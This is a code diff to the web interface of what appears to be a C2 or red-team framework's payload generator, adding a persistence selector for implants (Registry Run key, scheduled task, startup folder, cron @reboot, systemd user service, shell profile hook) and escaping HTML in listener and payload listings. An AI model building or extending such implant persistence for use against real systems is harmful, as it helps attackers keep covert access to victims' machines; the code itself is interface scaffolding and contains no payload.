@@ -53,6 +53,12 @@
             <label>Jitter (%)</label>
             <input type="number" class="form-input" id="payload-jitter" value="20">
         </div>
+        <div class="form-group" id="persist-group">
+            <label>Persistence (Executable only)</label>
+            <select class="form-input" id="payload-persist" onchange="updatePersistOptions()">
+            </select>
+            <div style="font-size:9px; color:#555; margin-top:3px; font-family:'JetBrains Mono';">autostart method installed by the implant on first run</div>
+        </div>
         <div class="form-group">
             <label>Allowed IPs (Whitelist)</label>
             <input type="text" class="form-input" id="payload-allowed-ips" placeholder="e.g. 192.168.1.0/24, 10.0.0.5">
@@ -214,7 +220,8 @@
             if (allListeners.length > 0) {
                 sel.innerHTML = allListeners.map(l => {
                     const proto = l.type === 'reverse_tcp' ? 'TCP' : 'HTTP';
-                    return `<option value="${l.id}" data-type="${l.type}">${l.name} [${proto}] (${l.bind_ip}:${l.port})</option>`;
+                    const remote = l.node_id && state && state.clusterSelf && l.node_id !== state.clusterSelf;
+                    return `<option value="${escapeHtml(l.id)}" data-type="${escapeHtml(l.type)}">${escapeHtml(l.name)} [${proto}] (${escapeHtml(l.bind_ip)}:${l.port})${remote ? ' &#127760; REMOTE' : ''}</option>`;
                 }).join('');
             } else {
                 sel.innerHTML = '<option value="">No listeners available</option>';
@@ -241,18 +248,18 @@
                 const typeLabel = getTypeLabel(p.type, p.os);
                 return `
                 <div class="beacon-row" style="grid-template-columns: 0.8fr 1fr 1fr 0.6fr 0.6fr 0.6fr 0.8fr 120px; padding:10px 20px;">
-                    <span style="font-family:'JetBrains Mono'; font-size:11px; color:var(--accent);">${p.id}</span>
-                    <span><i class="fas ${icon}" style="margin-right:6px; opacity:0.5;"></i>${p.name}</span>
-                    <span style="font-size:11px; text-transform:uppercase;">${typeLabel}</span>
-                    <span>${osIcon} ${(p.os || 'N/A').toUpperCase()}</span>
-                    <span style="font-size:11px; color:#888;">${p.arch || '-'}</span>
+                    <span style="font-family:'JetBrains Mono'; font-size:11px; color:var(--accent);">${escapeHtml(p.id)}</span>
+                    <span><i class="fas ${icon}" style="margin-right:6px; opacity:0.5;"></i>${escapeHtml(p.name)}</span>
+                    <span style="font-size:11px; text-transform:uppercase;">${escapeHtml(typeLabel)}</span>
+                    <span>${osIcon} ${escapeHtml((p.os || 'N/A').toUpperCase())}</span>
+                    <span style="font-size:11px; color:#888;">${escapeHtml(p.arch || '-')}</span>
                     <span style="font-size:11px; color:#888; font-family:'JetBrains Mono';">${formatFileSize(p.file_size)}</span>
                     <span style="font-size:11px; color:#888;">${new Date(p.created_at).toLocaleString()}</span>
                     <span style="text-align:right; display:flex; gap:10px; justify-content:flex-end;">
-                        <a href="${p.download_url}" download style="color:var(--accent); text-decoration:none; font-size:11px;" title="Download">
+                        <a href="${escapeHtml(p.download_url)}" download style="color:var(--accent); text-decoration:none; font-size:11px;" title="Download">
                             <i class="fas fa-download"></i>
                         </a>
-                        <span style="color:#ff3b30; cursor:pointer; font-size:11px;" onclick="deletePayload('${p.id}')" title="Delete">
+                        <span style="color:#ff3b30; cursor:pointer; font-size:11px;" onclick="deletePayload('${escapeHtml(p.id)}')" title="Delete">
                             <i class="fas fa-trash"></i>
                         </span>
                     </span>
@@ -260,6 +267,29 @@
             `}).join('');
         } catch(e) { console.error(e); }
     }
+
+    const persistOptionsByOS = {
+        windows: [
+            { value: 'auto',     label: 'Default (Registry Run key)' },
+            { value: 'startup',  label: 'Startup Folder copy' },
+            { value: 'schtasks', label: 'Scheduled Task (onlogon)' },
+            { value: 'none',     label: 'None' },
+        ],
+        linux: [
+            { value: 'auto',     label: 'Default (cron @reboot)' },
+            { value: 'systemd',  label: 'systemd User Service' },
+            { value: 'profile',  label: 'Shell Profile Hook' },
+            { value: 'none',     label: 'None' },
+        ],
+    };
+
+    window.updatePersistOptions = function() {
+        const os = document.getElementById('payload-os').value;
+        const sel = document.getElementById('payload-persist');
+        if (!sel) return;
+        const options = persistOptionsByOS[os] || persistOptionsByOS['windows'];
+        sel.innerHTML = options.map(o => `<option value="${o.value}">${o.label}</option>`).join('');
+    };
 
     window.generatePayload = async function() {
         const btn = document.getElementById('generate-btn');
@@ -278,6 +308,7 @@
             arch: document.getElementById('payload-arch').value,
             sleep: parseInt(document.getElementById('payload-sleep').value) || 60,
             jitter: parseInt(document.getElementById('payload-jitter').value) || 10,
+            persist_method: (document.getElementById('payload-persist')?.value || 'auto'),
             allowed_ips: (document.getElementById('payload-allowed-ips')?.value || '').trim(),
             blocked_ips: (document.getElementById('payload-blocked-ips')?.value || '').trim()
         };
@@ -332,5 +363,6 @@
     loadListeners();
     loadPayloads();
     updatePayloadTypeOptions();
+    updatePersistOptions();
 })();
 </script>
